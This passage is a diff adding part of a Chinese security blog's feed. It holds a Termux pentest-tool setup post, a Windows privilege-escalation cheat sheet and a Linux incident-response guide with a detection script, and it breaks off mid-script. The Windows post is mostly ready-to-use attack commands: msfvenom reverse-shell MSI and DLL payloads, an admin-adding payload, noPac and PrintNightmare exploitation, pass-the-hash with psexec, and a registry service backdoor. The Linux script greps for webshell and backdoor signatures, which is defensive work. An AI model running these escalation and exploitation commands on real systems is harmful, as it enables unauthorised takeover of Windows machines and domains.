+export LESS_TERMCAP_md=$(tput bold; tput setaf 6) # cyan
+export LESS_TERMCAP_me=$(tput sgr0)
+export LESS_TERMCAP_so=$(tput bold; tput setaf 3; tput setab 4) # yellow on blue
+export LESS_TERMCAP_se=$(tput rmso; tput sgr0)
+export LESS_TERMCAP_us=$(tput smul; tput bold; tput setaf 7) # white
+export LESS_TERMCAP_ue=$(tput rmul; tput sgr0)
+export LESS_TERMCAP_mr=$(tput rev)
+export LESS_TERMCAP_mh=$(tput dim)
+export LESS_TERMCAP_ZN=$(tput ssubm)
+export LESS_TERMCAP_ZV=$(tput rsubm)
+export LESS_TERMCAP_ZO=$(tput ssupm)
+export LESS_TERMCAP_ZW=$(tput rsupm)
+export GROFF_NO_SGR=1         # For Konsole and Gnome-terminal
+
+# 一些别名
+alias ll='ls -alh'
+alias la='ls -A'
+alias l='ls -CFlh'
+alias ls='ls --color=auto'
+alias dir='dir --color=auto'
+alias vdir='vdir --color=auto'
+alias grep='grep --color=auto'
+alias fgrep='fgrep --color=auto'
+alias egrep='egrep --color=auto'
+alias upgrade='pkg update &amp;&amp; pkg upgrade'
+
+# 环境变量
+export PATH=&quot;$HOME/.local/bin:$PATH&quot;
+</code></pre>
+<ul>
+<li>Tmux配置</li>
+</ul>
+<pre><code>cd
+git clone https://github.com/gpakosz/.tmux.git
+ln -s -f .tmux/.tmux.conf
+cp .tmux/.tmux.conf.local .
+</code></pre>
+<ul>
+<li>Vim配置</li>
+</ul>
+<pre><code>git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime
+sh ~/.vim_runtime/install_awesome_vimrc.sh
+</code></pre>
+<h2 id="开发环境">开发环境</h2>
+<ul>
+<li>C、Java、Python、Go、Rust、PHP、Rust</li>
+</ul>
+<pre><code>pkg install -y clang make cmake openjdk-17 ecj dx golang python php rust
+</code></pre>
+<ul>
+<li>pip镜像源</li>
+</ul>
+<pre><code>pip config set global.index-url https://mirrors.bfsu.edu.cn/pypi/web/simple
+</code></pre>
+<h2 id="渗透环境部署">渗透环境部署</h2>
+<ul>
+<li>常见工具</li>
+</ul>
+<pre><code>pkg install exiftool nmap nmap-ncat 
+pip install sqlmap
+cd $HOME &amp;&amp; mkdir Github &amp;&amp; cd Github
+git clone https://github.com/EASY233/Finger
+
+# dirsearch 依赖的cryptography库需要用pkg安装
+pkg install python-cryptography
+git clone https://github.com/maurosoria/dirsearch
+</code></pre>
+<ul>
+<li>xray</li>
+</ul>
+<pre><code>https://github.com/chaitin/xray/releases/   # 注意ARM64架构
+cd $HOME/Github &amp;&amp; mkdir xray
+wget https://github.com/chaitin/xray/releases/download/1.8.4/xray_linux_arm64.zip
+unzip xray_linux_arm64.zip
+./xray_linux_arm64 webscan --listen 127.0.0.1:2333 --html-output 2333.html  # 试运行
+</code></pre>
+<ul>
+<li>fscan从Github构建</li>
+</ul>
+<pre><code>cd $HOME/Github
+git clone https://github.com/shadow1ng/fscan
+cd fscan
+go build
+</code></pre>
+<ul>
+<li>metasploit</li>
+</ul>
+<pre><code>wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
+chmod +x metasploit.sh
+./metasploit.sh
+</code></pre>
+<h2 id="常见问题">常见问题</h2>
+<ul>
+<li>libssl.so.1.1 not found (主要是版本原因，建议去Github下载)</li>
+</ul>
+<pre><code># CANNOT LINK EXECUTABLE &quot;/data/data/com.termux/files/usr/lib/apt/methods/https&quot;: library &quot;libssl.so.1.1&quot; not found
+
+find /data/data/com.termux/files -name 'libssl.so'      # 查找openssl-1.1的位置
+
+export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib/openssl-1.1/     # 添加给库变量LD_LIBRARY_PATH
+
+echo &quot;export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib/openssl-1.1/&quot; &gt;&gt; ~/.bashrc     # Bash环境永久生效
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Windows提权]]></title>
+        <id>https://Zer0-hex.github.io/post/windows-ti-quan/</id>
+        <link href="https://Zer0-hex.github.io/post/windows-ti-quan/">
+        </link>
+        <updated>2022-09-15T02:51:03.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="windows提权">Windows提权</h1>
+<p>在Windows机器上，权限不足很致命，很多操作会有限制，很难横向。这时候就需要很骚的提权操作了。</p>
+<p>以下提权手法应当按优先考虑，尽量用最简单的方式快速提权。</p>
+<h2 id="如果可以控制桌面">如果可以控制桌面</h2>
+<ul>
+<li>
+<p>Win + R -&gt; azman.msc -&gt; 帮助 -&gt; 右键打开源文件位置 -&gt; 打开 -&gt; cmd</p>
+</li>
+<li>
+<p>如果任何用户具有管理员访问权限，即使该用户没有完全或更高的权限<br>
+可以通过修改编辑器的默认打开权限，然后链式调用cmd提权。</p>
+</li>
+</ul>
+<h2 id="内核漏洞提权">内核漏洞提权</h2>
+<p>内核漏洞提权可以根据当前机器的版本以及其所打的补丁来判断，可以利用自动化工具一键扫描。</p>
+<ul>
+<li></li>
+<li></li>
+</ul>
+<pre><code>&gt; systeminfo &gt; systeminfo.txt
+...wesng/&gt;python wes.py -u
+...wesng/&gt;python wes.py systeminfo.txt -e -i &quot;Remote Code Execution&quot;
+
+</code></pre>
+<h2 id="msi自动安装策略提权">MSI自动安装策略提权</h2>
+<ul>
+<li>检查注册表是否开启相关功能</li>
+</ul>
+<pre><code>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+</code></pre>
+<p>默认值为0x1则为开启自动安装。</p>
+<ul>
+<li>生成.msi木马</li>
+</ul>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=443 -f msi &gt; /tmp/1.msi
+</code></pre>
+<p>也可以生成命令执行的msi，将用户加入到管理员组</p>
+<pre><code>msfvenom -p windows/exec CMD='net localgroup administrators raaz /add' -f msi &gt; /tmp/2.msi
+</code></pre>
+<ul>
+<li>运行安装</li>
+</ul>
+<pre><code>msiexec /quiet /qn /i 1.msi
+</code></pre>
+<ul>
+<li>msf集成模块</li>
+</ul>
+<pre><code>use exploit/windows/local/always_install_elevated
+msf exploit(always_install_elevated) &gt; set session 1
+msf exploit(always_install_elevated) &gt; exploit
+</code></pre>
+<h2 id="打印机提权">打印机提权</h2>
+<p>首先，你需要一个PrintSpoofer.exe。</p>
+<ul>
+<li>PrintSpoofer</li>
+<li>PrintSpoofer64.exe -i -c cmd</li>
+</ul>
+<h2 id="cve">CVE</h2>
+<h3 id="cve-2021-36934">CVE-2021-36934</h3>
+<ul>
+<li>获取管理员哈希</li>
+</ul>
+<pre><code>运行exp即可获取以下文件
+SAM
+System
+Security
+----------------------------
+python3 secretsdump.py -sam /root/SAM -system /root/SYSTEM -security /root/SECURITY LOCAL
+</code></pre>
+<ul>
+<li>权限提升</li>
+</ul>
+<pre><code>利用Hash传递
+python3 psexec.py -hashes 00000000000000000000000000000000:7ce21f17c0aee7fb9ceba532d0546ad6 administrator@192.168.1.145
+</code></pre>
+<h3 id="cve-2021-42278">CVE-2021-42278</h3>
+<ul>
+<li>补丁</li>
+</ul>
+<pre><code>KB5008602 – https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7
+
+KB5008380 – https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041
+</code></pre>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code>git clone https://github.com/Ridter/noPac
+
+python3 noPac.py ignite.local/sakshi:'Password@1' -dc-ip 192.168.1.1 -shell --impersonate administrator -use-ldap
+</code></pre>
+<h2 id="注册表自启动提权">注册表自启动提权</h2>
+<ul>
+<li>需要操作的注册表</li>
+</ul>
+<pre><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\当前版本\运行
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+</code></pre>
+<p><a href="https://www.hackingarticles.in/windows-privilege-escalation-logon-autostart-execution-registry-run-keys/">详情</a></p>
+<h2 id="未加引号的服务路径">未加引号的服务路径</h2>
+<pre><code>如果存在一个服务，其可执行程序的路径为：
+C:\Program Files\Ignite Data\Vuln Service\file.exe
+
+那么以下路径的EXE可以劫持此服务
+C:\Program Files\Ignite Data\Vuln.exe
+C:\Program Files\Ignite.exe
+C:\Program.exe
+</code></pre>
+<h2 id="拥有所有权限的注册表提权">拥有所有权限的注册表提权</h2>
+<blockquote>
+<p>服务同理</p>
+</blockquote>
+<p>利用工具<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk">AccessChk</a>进行检查。</p>
+<pre><code>.\accesschk.exe /accepteula &quot;authenticated users&quot; -kvuqsw hklm\System\CurrentControlSet\services
+------------------------------------------------------------------------------
+RW HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pentest
+        KEY_ALL_ACCESS
+------------------------------------------------------------------------------
+发现可利用注册表服务，查询程序路径：
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pentest
+
+查看权限
+Get-Acl -Path HKLM：\SYSTEM\CurrentControlSet\Services\pentest
+
+加个马
+reg add  &quot;HKLM\system\currentcontrolset\services\pentest&quot; /t REG_EXPAND_SZ /v ImagePath /d “C:\backdoor.exe” /f
+</code></pre>
+<h2 id="拥有所有权限的服务提权">拥有所有权限的服务提权</h2>
+<ul>
+<li>msf集成</li>
+</ul>
+<pre><code>use exploit/windows/local/service_permissions
+set lhost 192.168.1.3
+set session 1
+exploit
+</code></pre>
+<h2 id="计划任务劫持提权">计划任务劫持提权</h2>
+<pre><code>查找可以劫持的计划任务
+schtasks /query /fo LIST /v
+</code></pre>
+<h2 id="printnightmare">PrintNightmare</h2>
+<blockquote>
+<p>https://www.hackingarticles.in/windows-privilege-escalation-printnightmare/</p>
+</blockquote>
+<p>利用两个CVE</p>
+<ul>
+<li>
+<p>CVE-2021-34527    远程代码执行</p>
+</li>
+<li>
+<p>CVE-2021-1675      本地权限提升</p>
+</li>
+<li>
+<p>Python RCE</p>
+</li>
+</ul>
+<pre><code>生成dll马
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f dll -o evil.dll
+
+开启监听
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.2
+set LPORT 4444
+exploit
+
+加载CVE-2021-1675 EXP模块
+use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
+set RHOSTS 192.168.1.190
+set SMBUser ignite
+set SMBPass 123
+set DLL_PATH /
+exploit
+
+利用CVE-2021-34527执行命令
+git clone https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527
+cd PrintNightmare-CVE-2021-34527
+chmod 777 CVE-2021-34527.py
+
+共享恶意dll所在路径
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /root
+
+./CVE-2021-34527.py ignite:123@192.168.1.190 '\\192.168.1.2\share\evil.dll'
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Linux应急响应]]></title>
+        <id>https://Zer0-hex.github.io/post/linux-ying-ji-xiang-ying/</id>
+        <link href="https://Zer0-hex.github.io/post/linux-ying-ji-xiang-ying/">
+        </link>
+        <updated>2022-09-14T03:23:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="linux入侵简单排查">Linux入侵简单排查</h2>
+<p>Work with <a href="https://kerno-yep.github.io/">Kerno</a></p>
+<h3 id="账号安全排查">账号安全排查</h3>
+<ul>
+<li>/etc/passwd</li>
+<li>/etc/shadow</li>
+<li>awk -F: '$3==0 {print $1}' /etc/passwd    // 排查超级用户</li>
+<li>last  // 查看最近用户登录，注销信息</li>
+<li>lastlog -u USER   // 查看指定用户登录信息</li>
+</ul>
+<pre><code class="language-shell">#排查处理
+userdel -r user  #删除user用户,且删除/home目录下的账户目录
+</code></pre>
+<h3 id="进程排查">进程排查</h3>
+<ul>
+<li>ps aux  //进程相关信息</li>
+<li>ls -l /proc/PID/file   //查看pid所对应的进程文件路径</li>
+<li>lsof -c [进程]  //某个进程所打开相关文件信息</li>
+</ul>
+<pre><code class="language-shell">#排查处理
+kill -9 [进程号]
+rm -rf [文件]
+</code></pre>
+<h3 id="端口排查">端口排查</h3>
+<ul>
+<li>netstat -antlp | more</li>
+</ul>
+<pre><code class="language-shell">#排查处理
+netstat -anp | grep PORT
+kill -9 [进程号]
+</code></pre>
+<h3 id="计划任务排查">计划任务排查</h3>
+<ul>
+<li>crontab -l</li>
+<li>/var/spool/cron/*</li>
+</ul>
+<p>在排查以上内容完成处理后，仍有恶意计划任务启动，排查以下文件</p>
+<ul>
+<li>/etc/crontab</li>
+<li>/etc/anacrontab</li>
+<li>var/spool/anacron</li>
+<li>/etc/cron.d/*</li>
+<li>/etc/cron.daily/*</li>
+<li>/etc/cron.hourly/*</li>
+<li>/etc/cron.monthly/*</li>
+<li>/etc/cron.weekly/*</li>
+</ul>
+<pre><code class="language-shell">#排查处理
+当只需要删除某一条计划任务时，可以通过“crontab -e”命令进行编辑
+而若要清空某个用户的所有计划任务，可以执行“crontab -r”命令
+</code></pre>
+<h3 id="历史命令排查">历史命令排查</h3>
+<ul>
+<li>history  //root历史命令</li>
+<li>/home/{user}/.bash_history  //普通用户账号历史命令</li>
+</ul>
+<pre><code class="language-shell">#排查处理
+cat .bash_history &gt;&gt; 1.txt #留存分析
+</code></pre>
+<h3 id="日志排查">日志排查</h3>
+<pre><code class="language-shell">#查看 Linux ssh 登陆审计日志
+/var/log/secure #Centos 与 RedHat 日志路径
+/var/log/auth.log #Ubuntu 与 Debian 日志路径
+</code></pre>
+<h3 id="附件">附件</h3>
+<pre><code class="language-html">https://git.io/linux    &lt;!--linux命令查询--&gt;
+https://github.com/grayddq/GScan/releases  &lt;!--快速安全检查脚本--&gt;
+</code></pre>
+<h3 id="检查脚本">检查脚本</h3>
+<pre><code class="language-shell">#!/bin/bash
+echo &quot;usage:./LinuxChk.sh &gt;a.txt&quot;
+
+echo ----------------------------------------------------------
+echo &quot;本机IP：&quot;
+ifconfig -a| grep --color &quot;\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}&quot;
+
+echo &quot;内核版本&quot;
+uname -a
+
+echo ----------------------------------------------------------
+echo &quot;检查网络连接和监听端口&quot;
+netstat -anp | grep &quot;tcp&quot; 
+echo ----------------------------------------------------------
+echo &quot;可能的危险连接&quot;
+netstat -anp | grep &quot;4433|4444|3333|5555|2222|1111&quot; 
+
+echo ----------------------------------------------------------
+echo &quot;查看僵尸进程（此处进程可自行指定）&quot;
+ps -ef | grep &quot;miner|zombie|xmr|pool|hook&quot; | grep -v grep 
+echo &quot;若发现恶意进程，请用ls -l /proc/pid  查看进程相关目录&quot;
+
+echo ----------------------------------------------------------
+echo &quot;耗CPU最多的进程（前5）&quot;
+ps auxf|head -1;ps auxf|grep -v PID|sort -rn -k 3|head -5
+
+
+echo ----------------------------------------------------------
+echo &quot;耗内存最多的进程&quot;
+ps auxf|head -1;ps auxf|grep -v PID|sort -nr -k 4 |head -5
+#ls -l /proc/pid
+echo ----------------------------------------------------------
+echo &quot;计划任务&quot;
+crontab -l # 查看当前用户的计划任务
+crontab -l -u root # 查看root用户的计划任务
+
+
+echo ----------------------------------------------------------
+awk -F&quot;:&quot; '{if($2!~/^!|^*/){print &quot;(&quot;$1&quot;)&quot; &quot; 是一个未被锁定的账户，请管理员检查是否需要锁定它或者删除它。&quot;}}' /etc/shadow
+
+echo ----------------------------------------------------------
+echo &quot;查看系统密码文件修改时间&quot;
+ls -ltr /etc/passwd
+
+echo ----------------------------------------------------------
+echo &quot;查看系统中存在哪些非系统默认用户&quot;
+echo &quot;root:x:“该值大于500为新创建用户，小于或等于500为系统初始用户”&quot;
+more /etc/passwd |awk -F &quot;:&quot; '{if($3&gt;500){print &quot;/etc/passwd里面的&quot;$1 &quot;的值为&quot;$3&quot;，请管理员确认该账户是否正常。&quot;}}'
+
+echo ----------------------------------------------------------
+echo  &quot;查看是否开启了ssh服务&quot;
+if service sshd status | grep -E &quot;running|listening on|active \(running\)&quot;; then
+echo &quot;SSH服务已开启&quot;
+ls -l ~/.ssh/authorized_keys
+else
+echo &quot;SSH服务未开启&quot;
+fi
+
+echo ----------------------------------------------------------
+echo  &quot;查看系统SSH远程访问设置策略(hosts.allow允许列表)&quot;
+if more /etc/hosts.allow | grep -E &quot;sshd: &quot;;more /etc/hosts.allow | grep -E &quot;sshd&quot;; then
+echo  &quot;远程访问策略已设置 &quot;
+else
+echo  &quot;远程访问策略未设置 &quot;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;查看是否开启了TELNET服务&quot;
+if more /etc/xinetd.d/telnetd 2&gt;&amp;1|grep -E &quot;disable=no&quot;; then
+echo  &quot;TELNET服务已开启 &quot;
+else
+echo  &quot;TELNET服务未开启 &quot;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;查看syslog日志是否开启外发&quot;
+if more /etc/rsyslog.conf | egrep &quot;@...\.|@..\.|@.\.|\*.\* @...\.|\*\.\* @..\.|\*\.\* @.\.&quot;;then
+echo &quot;客户端syslog日志已开启外发&quot;
+else
+echo &quot;客户端syslog日志未开启外发&quot;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;查看系统日志文件是否存在&quot;
+log=/var/log/syslog
+log2=/var/log/messages
+log3=/var/log/cron
+log4=~/.bash_history
+log5=/var/log/secure
+if [ -e &quot;$log&quot; ]; then
+echo  &quot;syslog日志文件存在！ &quot;
+else
+echo  &quot;/var/log/syslog日志文件不存在！ &quot;
+fi
+
+if [ -e &quot;$log2&quot; ]; then
+echo  &quot;/var/log/messages日志文件存在！ &quot;
+else
+echo  &quot;/var/log/messages日志文件不存在！ &quot;
+fi
+
+if [ -e &quot;$log3&quot; ]; then
+echo  &quot;/var/log/cron日志文件存在！ &quot;
+else
+echo  &quot;/var/log/cron日志文件不存在！ &quot;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;查看passwd文件中有哪些特权用户&quot;
+awk -F: '$3==0 {print $1}' /etc/passwd
+
+echo ----------------------------------------------------------
+echo &quot;查看系统中是否存在空口令账户&quot;
+awk -F: '($2==&quot;!!&quot;) {print $1}' /etc/shadow
+echo &quot;该结果不适用于Ubuntu系统&quot;
+
+echo -----------------------------------------------------------
+echo &quot;查看系统中root用户外连情况&quot;
+lsof -u root |egrep &quot;ESTABLISHED|SYN_SENT|LISTENING&quot;
+echo ---------------状态解释-------------------------------
+echo &quot;ESTABLISHED的意思是建立连接。表示两台机器正在通信。&quot;
+echo &quot;LISTENING表示监听状态&quot;
+echo &quot;SYN_SENT表示请求连接&quot;
+
+echo ----------------------------------------------------------
+echo &quot;查看系统中root用户TCP连接情况&quot;
+lsof -u root |egrep &quot;TCP&quot;
+
+
+echo ----------------------------------------------------------
+echo &quot;检查系统守护进程&quot;
+more /etc/xinetd.d/rsync | grep -v &quot;^#&quot;
+
+echo ----------------------------------------------------------
+echo &quot;/root目录&quot;
+ls -l /tmp
+echo ----------------------------------------------------------
+echo &quot;/tmp目录&quot;
+ls -l /tmp
+echo ----------------------------------------------------------
+echo &quot;/var/log/目录&quot;
+ls -l /var/log/
+echo ----------------------------------------------------------
+echo &quot;secure历史密码错误次数&quot;
+grep -c &quot;authentication failure&quot; /var/log/secure*
+echo ----------------------------------------------------------
+echo &quot;检查secure近期登录成功日志（旧的不在此范围）&quot;
+more /var/log/secure |grep &quot;Accepted password&quot;
+echo &quot;secure历史登录成功记录，输出到/tmp/secure-logined.log&quot;
+grep &quot;Accepted password&quot; /var/log/secure* &gt;/tmp/secure-logined.log
+
+echo ----------------------------------------------------------
+echo &quot;history历史命令&quot;
+history
+echo ----------------------------------------------------------
+echo &quot;查看正常情况下登录到本机的所有用户的历史记录&quot;
+last
+
+echo ----------------------------------------------------------
+echo &quot;-------查找最近一天被修改的PHP文件--------&quot;
+find -mtime -1 -type f -name ＼*.php
+echo ----------------------------------------------------------
+echo &quot;-------隐藏进程查找---------&quot;
+ps -ef |awk '{print}'|sort -n |uniq &gt;1
+echo ----------------------------------------------------------
+echo &quot;-------查找最近一天被修改的任意文件--------&quot;
+find -mtime -1 -type f -name ＼*.*
+
+echo ----------------------------------------------------------
+echo &quot;检查系统中关键文件修改时间&quot;
+ls -ltr /bin/ls /bin/login /etc/passwd /bin/ps /usr/bin/top /etc/shadow|awk '{print &quot;文件名：&quot;$9&quot;  &quot;&quot;最后修改时间：&quot;$6&quot; &quot;$7&quot; &quot;$8}'
+echo &quot;ls文件：是存储ls命令的功能函数，被删除以后，就无法执行ls命令，黑客可利用篡改ls文件来执行后门或其他程序。
+login文件：login是控制用户登录的文件，一旦被篡改或删除，系统将无法切换用户或登陆用户
+user/bin/passwd是一个命令，可以为用户添加、更改密码，但是，用户的密码并不保存在/etc/passwd当中，而是保存在了/etc/shadow当中
+etc/passwd是一个文件，主要是保存用户信息。
+sbin/portmap是文件转换服务，缺少该文件后，无法使用磁盘挂载、转换类型等功能。
+bin/ps 进程查看命令功能支持文件，文件损坏或被更改后，无法正常使用ps命令。
+usr/bin/top  top命令支持文件，是Linux下常用的性能分析工具,能够实时显示系统中各个进程的资源占用状况。
+etc/shadow shadow 是 /etc/passwd 的影子文件，密码存放在该文件当中，并且只有root用户可读。&quot;
+
+echo ----------------------------------------------------------
+echo &quot;--------检查系统是否存在PHP脚本后门---------------------&quot;
+
+if find / -type f -name *.php | xargs egrep -l &quot;专用网马|udf.dll|class PHPzip|ZIP压缩程序 荒野无灯修改版|AnonymousUserName|Root_CSS\(\)|黑狼PHP木马|eval\(gzuncompress\(base64_decode|shell|Shell|PHP木马|eval\($_POST|eval\($_GET|system\($_REQUEST|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门|substr\(PHP_OS|is_callable\(|backdoor|博彩&quot; |sort -n|uniq -c |sort -rn 1&gt;/dev/null 2&gt;&amp;1;then
+
+echo &quot;检测到PHP脚本后门&quot;
+
+find / -type f -name *.php | xargs egrep -l &quot;专用网马|udf.dll|class PHPzip|ZIP压缩程序 荒野无灯修改版|AnonymousUserName|Root_CSS\(\)|黑狼PHP木马|eval\(gzuncompress\(base64_decode|shell|Shell|PHP木马|eval\($_POST|eval\($_GET|system\($_REQUEST|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门|substr\(PHP_OS|is_callable\(|backdoor|博彩&quot; |sort -n|uniq -c |sort -rn
+
+find / -type f -name *.php | xargs egrep -l &quot;专用网马|udf.dll|class PHPzip|ZIP压缩程序 荒野无灯修改版|AnonymousUserName|Root_CSS\(\)|黑狼PHP木马|eval\(gzuncompress\(base64_decode|shell|Shell|PHP木马|eval\($_POST|eval\($_GET|system\($_REQUEST|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门|substr\(PHP_OS|is_callable\(|backdoor|博彩&quot; |sort -n|uniq -c |sort -rn |awk '{print $2}' | xargs -I{} cp {} /tmp/
+
+echo &quot;后门样本已拷贝到/tmp/目录&quot;
+else
+echo &quot;未检测到PHP脚本后门&quot;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;---------检查系统是否存在JSP脚本后门---------------------&quot;
+if find / -type f -name *.jsp | xargs egrep -l &quot;java.io.FileOutputStream\(application.getRealPath|request.getParameter\(\&quot;pass|exec\(request.getParameter\(|InputStreamReader\(this.is\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门|JFolder|backdoor|博彩&quot; 2&gt;&amp;1;then
+echo &quot;检测到JSP脚本后门&quot;
+
+find / -type f -name *.jsp | xargs egrep -l &quot;java.io.FileOutputStream\(application.getRealPath|request.getParameter\(\&quot;pass|exec\(request.getParameter\(|InputStreamReader\(this.is\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门|JFolder|backdoor|博彩&quot;  |sort -n|uniq -c |sort -rn
+find / -type f -name *.jsp | xargs egrep -l &quot;java.io.FileOutputStream\(application.getRealPath|request.getParameter\(\&quot;pass|exec\(request.getParameter\(|InputStreamReader\(this.is\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门|JFolder|backdoor|博彩&quot; |sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/ 
+echo &quot;后门样本已拷贝到/tmp/目录&quot;
+else
+echo &quot;未检测到JSP脚本后门&quot;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;--------检查系统是否存在HTML恶意代码---------------------&quot;
+if find / -type f -name *.html | xargs egrep -l &quot;hack|WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330|博彩|script src=\&quot;http&quot; 1&gt;/dev/null 2&gt;&amp;1;then
+echo &quot;发现HTML恶意代码&quot;
+find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330|博彩|script src=\&quot;http&quot; |sort -n|uniq -c |sort -rn
+
+find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330|博彩|script src=\&quot;http&quot; |sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/
+
+echo &quot;HTML恶意文件已拷贝到/tmp/目录&quot;
+else
+echo &quot;未检测到HTML恶意代码&quot;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;--------检查系统是否存在perl恶意程序--------------------&quot;
+if find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot; 1&gt;/dev/null 2&gt;&amp;1;then
+echo &quot;发现perl恶意程序&quot;
+find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;|sort -n|uniq -c |sort -rn
+
+find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;|sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/
+
+echo &quot;可疑样本已拷贝到/tmp/目录&quot;
+else
+echo &quot;未检测到perl恶意程序&quot;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;--------检查系统是否存在Python恶意程序-------------&quot;
+
+find / -type f -name &quot;*.py&quot; | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb|exec\(base64&quot; |sort -n|uniq -c |sort -rn
+
+find / -type f -name &quot;*.py&quot; | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb|exec\(base64&quot; |sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/
+
+
+echo ----------------------------------------------------------
+echo &quot;-----------开始检查系统是否存在易受攻击的漏洞---------------------&quot;
+
+if ps aux | grep &quot;httpd|apache|tomcat|nginx&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then
+    ps aux | grep &quot;httpd|apache|tomcat|nginx&quot; | grep -v grep 
+	echo &quot;Web服务运行中&quot;     
+else
+    echo &quot;未发现 httpd|apache|tomcat|nginx&quot;;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在redis未授权访问漏洞---------------------&quot;
+if ps aux | grep &quot;redis&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then
+    ps aux | grep &quot;redis&quot; | grep -v grep 
+	echo &quot;存在redis服务&quot;
+    echo &quot;开始检查redis配置安全&quot;
+    find / -name redis.conf | xargs egrep &quot;requirepass |^[^#]*bind |^[^#]*port &quot;  
+else
+    echo &quot;未发现使用redis服务&quot;;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在docker未授权访问漏洞---------------------&quot;
+if ps aux | grep &quot;docker&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then 
+	ps aux | grep &quot;docker&quot; | grep -v grep 
+	echo &quot;docker运行中，默认2375端口，可能存在Docker remote api未授权访问漏洞！&quot;; 
+else echo &quot;未发现对外开放docker服务&quot;;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在Memcache未授权访问漏洞---------------------&quot;
+if ps aux | grep &quot;memcache|:11211&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then 
+	ps aux | grep &quot;memcache&quot; | grep -v grep 
+	echo &quot;开放了11211端口，可能存在Memcache未授权访问漏洞！&quot;; else echo &quot;未发现对外开放Memcache服务&quot;;fi
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在Zookeeper未授权访问漏洞---------------------&quot;
+if ps aux | grep &quot;zookeeper|:2181&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then 
+	ps aux | grep &quot;zookeeper|:2181&quot; | grep -v grep 
